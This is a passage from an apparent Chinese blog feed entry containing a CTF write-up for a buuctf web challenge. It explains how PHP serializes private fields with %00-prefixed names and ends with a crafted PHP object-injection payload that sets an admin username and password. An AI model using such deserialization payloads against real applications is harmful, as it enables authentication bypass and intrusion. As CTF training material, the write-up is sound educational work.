声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><p>因此我们在类名和字段名前面加上\0的前缀，而\0 在url栏中会出现空白符，复制的时候丢失，所以我们加上%00</p><p>最后得到payload</p><pre><code>?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
</feed>
